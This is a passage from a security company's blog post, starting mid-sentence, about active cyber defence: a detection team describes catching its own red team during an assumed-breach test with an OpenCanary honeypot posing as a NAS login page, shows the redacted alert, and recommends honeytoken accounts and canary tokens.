called OpenCanary. This open-source project from Thinkst emulates different network protocols and when interacted with, creates an alert providing information to the defensive team, such as the source of the request.\nAn unfair advantage We believe all organisations should be able to incrementally build on their level of security, year-on-year. This means leaving generic behind and focusing on the specific threats you face, and outcomes you need to be secure from them. To do this, we draw on the expertise and attacker mindset of our offensive Team to develop sophisticated attack paths tailored to each client’s environment. These are then used to test the defences and monitoring systems set up by our Detection and Response Team (DART).\nAs a member of the DART working on the defensive side, I find these engagements particularly rewarding. I’m confident that this sentiment is shared by the offensive team and our clients as well, since both teams ultimately work together to strengthen the security of our client.\nThis collaborative, and at times competitive, dynamic between the teams where the defensive team gains insights into the inner workings of exploit tools, while the offensive team learns how to avoid detection, helps us to create new detections and anticipate potential future evasion techniques.\nIf you are a Blue Teamer or working on the defensive side in a SOC and have experienced a Purple team engagement, you may have noticed that almost always the offensive team will achieve their set objectives. Often this is thanks to the client’s IT admins with their easy-to-guess passwords which are set to never expire, or SMB shares with credentials in a cleartext file, or thanks to Active Directory Certificate Services; a gift that keeps on giving\nDetection and or prevention for all of these techniques is a challenge for a defender.\nOne can only cover so many techniques from MITRE ATT\u0026CK bingo.\n[learn_more caption=“MITRE ATT\u0026CK bingo.” state=“open”] The process of shouting “Bingo!” when you have covered a technique from the ATT\u0026CK matrix. Just because you have identified a single way to detect a technique does not mean you can colour the box green, adversaries have multiple ways they can perform most techniques. Read more about how NOT to use ATT\u0026CK [/learn_more]\nTo make matters more complicated, your adversary—in this case, the offensive team—sometimes starts with access to the client’s network (an assumed breach), which is common practice when aiming to fully leverage the offensive team’s capabilities.\nSo, you can quickly imagine the offensive team enumerating and accessing network shares as a regular user only to discover admin credentials within a PowerShell script. In some cases we have seen these scripts were created by an IT admin with domain admin privileges to automate various tasks and simplify their work. You might think this scenario is uncommon, however it is how Uber was hacked in 2022 and this happens so frequently that there are memes on X/Twitter on the topic.\n4 As a defender all those latest detections you put in place to detect Mimikatz or the sophisticated bloodhound queries are now useless. The adversary (again, the offensive team in this case) got the keys to the castle and can stroll right through the front door. This situation can feel like an overwhelming challenge and an unfair advantage for the adversary, so what’s a defender to do?\n5 Go ahead, cry if you need to—let it out. But no, that’s not where it ends. I’m not saying you shouldn’t cry, but after you do, it’s time to regain control.\n“No more tears” formula Consider it this way: an adversary has entered your environment, but it’s your environment—you know what happens in this environment from the logs you have and pretty dashboards that you see everyday, you know which of your IT admins still use PsExec to troubleshoot problems on remote servers, you know which developer has created a script that bruteforces your entire AD user database just to create an inventory of users. Now, the attacker is on your turf, and you set the rules of engagement. You control what they see, what they interact with, and how you can use this knowledge to your advantage.\n6 Instead of passively waiting for an alert to trigger, you take an active role in countering the threat actor through Active Cyber Defence. This involves proactively engaging, disrupting, and countering the attack. To clarify, this isn’t about hacking back. Rather, it’s about setting traps within your environment and waiting for the threat actor to interact with them—one type of trap is is known as a honeytoken. Honeytokens are decoys that are designed to detect unauthorised or malicious activity within a system in your network. They can take many forms, such as fake credentials, files, user accounts that seem legitimate but are actually traps. When an attacker interacts with a honeytoken, it triggers an alert, allowing the defenders to detect a breach or malicious intent early. The challenge then becomes how to implement this strategy in a way that is easy to deploy, maintain, and most importantly, doesn’t increase your attack surface.\nLet’s revisit what actually happened in the incident I mentioned previously after being challenged by an assumed breach in one of our Managed Extended Detection \u0026 Response (MxDR) clients, we realised the need to improve our response and regain control. Over the years, we had developed numerous detection use cases in collaboration with our offensive team, but on the flip side, the offensive team also created bypass techniques and constantly introduced new evasion strategies. We needed a quick win—something that would provide us with high-fidelity alerts as early as possible in the attack cycle, or in some cases, even at an advanced stage of the adversary’s objectives.\nWe deployed OpenCanary; a free and open-source decentralised honeypot by the amazing people at Thinkst Applied Research. We configured that server to expose fake SSH and HTTP servers. The HTTP server had a web page that looked like this.\nAn old Synology DiskStation NAS server with usernames and passwords fields. Now tell me if you are an offensive security consultant who has done a little HackTheBox boxes or played in CTF what’s the first thing you are going to do to this page?\nNaturally, you’d try admin/admin or admin/password combinations. If not, I might question your L33T hacker credentials and that’s exactly what the offensive team in question did during their reconnaissance. The mere fact that they visited this page had already triggered an alert in our system. No one was supposed to access this page, and its existence was known to only a few people. Only the offensive team, after scanning the entire network, discovered this server with an exposed, outdated HTTP service and decided to take their shot.\nIn combat, deception can strengthen the weaker side. When all other factors are equal the more deceptive player or the team will always win. - Barton Whaley\nI had configured this alert to be sent to two different outputs (Google + Slack). When I first saw the alert, I was in complete disbelief. My mind started racing—the excitement, the adrenaline. Thoughts like “There’s no way,” “This can’t be real,” “It must be a misfire from the canary server restarting,” kept running through my head. But then I remembered, I had fine-tuned that alert a long time ago. “Did I really just catch something…?” No, that can’t be it. I needed to double-check—actually, triple-check—to be sure.\n[box type=“shadow”]\n{ “dst_host”: “172.XX.X.X”, “dst_port”: 80, “local_time”: “2024-06-19 13:20:12.162738”, “local_time_adjusted”: “2024-06-19 13:20:12.162764”, “logdata”: { “HOSTNAME”: “10.XXX.XXX.XX”, “PASSWORD”: “”, “PATH”: “/index.html”, “SKIN”: “nasLogin”, “USERAGENT”: “Mozilla/5.0 (Windows NT 6.4;) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.2535.51 Safari/537.36 Edge/125.0.2535.10122”, “USERNAME”: “admin” }, “logtype”: 3001, “node_id”: “CANARY-SERVER”, “src_host”: “10.XXX.XXX.XX”, “src_port”: 44214, “utc_time”: “2024-06-19 13:20:12.162760” }\nDetails of alert [/box]\nSo, I triple-checked. The client had an ongoing assumed breach engagement, but I wasn’t directly involved in the day-to-day alerts. I looped in my fellow DART members for a sanity check, and we agreed to raise it with the client to confirm, just to be absolutely certain. And yes, we did it.\nYou might think it’s not such a big achievement, but let me tell you…as a Defender, catching an attacker in the assumed breach, right in their reconnaissance stage, using such a simple tool is nothing short of incredible. The satisfaction that comes from outmanoeuvring them before they even trigger other detections is beyond words. This is the kind of victory that reinforces why we do what we do—staying one step ahead and stopping the threat before it even starts.\nWe chose OpenCanary over other honeypots like Cowrie, Mailoney, and Snare for several reasons, but the primary one is its ease of deployment—especially if you have Docker installed on your host. It’s modular and can simulate various services such as SSH, FTP, HTTP, and VNC, plus it can send alerts directly to a webhook. This makes deployment and maintenance straightforward. In contrast, using multiple honeypot services would require installing each one separately, collecting their logs, forwarding them to a centralised SIEM, and setting up alerts there. If any part of that pipeline fails, you risk missing your most critical alerts.\nDeploying OpenCanary is straightforward, but some maintenance is needed depending on your environment. If you’re using regular vulnerability scanners like Nessus or network mapping tools like PRTG Network Monitor, you’ll want to add those IP ranges to the ip.ignorelist in the configuration file to avoid false alarms. After that, you can connect it to your Teams or GoogleChat via webhook, forward the alerts to your SIEM, or set up email notifications—whatever works best for you. Once configured, you can set it and forget it.\nSetting up a server like OpenCanary is just one of many ways to set traps for your adversaries. For instance, you can create multiple fake user accounts in Active Directory, each with different roles. (Pro tip: Use ChatGPT to help you generate realistic fake personas and create fake LinkedIn profiles for them.) Ensure these accounts have complex passwords, and configure your SIEM to alert you if anyone tries to authenticate them. If you use Microsoft Defender for Identity(MDI), you can designate these accounts as honeytokens, and MDI will handle the rest (https://learn.microsoft.com/en-us/defender-for-identity/entity-tags). This is particularly useful during the Red Team’s reconnaissance phase when they might use tools like BloodHound to enumerate users from the Domain Controller—triggering an alert in the process. It’s a simple win that saves you from having to baseline requests sent to the DC for your detection queries.\nAdditionally, you can visit canarytokens.org to easily create various types of Canary tokens, such as Microsoft Word/Excel or PDF documents that trigger an alert when opened. These files can be strategically placed in your organisation’s internal shares. Tools like MANSPIDER, which crawl SMB shares in search of valuable data, may stumble upon and activate these Canarytokens.\nOne of my favourite examples involves using a “Fast Redirect Token” from canarytokens.org which alerts when someone visits your URL.\nHere is one of our Senior Security Consultants I lured into triggering this alert and getting rickrolled in the process.\nI’ll wrap up this blog post by encouraging you to implement Cyber Deception techniques in your environment. These methods aren’t new, are often free, easy to set up, and offer some of the most reliable alerts available.\nIf you’re interested in learning more about Cyber Deception, I highly recommend checking out John Strand’s course, which you can find here: Active Defense and Cyber Deception with John Strand.\nAdditionally, be sure to explore the free Canary Tokens service provided by the fantastic team at Thinkst: Canary Tokens.","what-happened#What Happened?":""},"title":"Active Cyber Defence - Taking back control"}}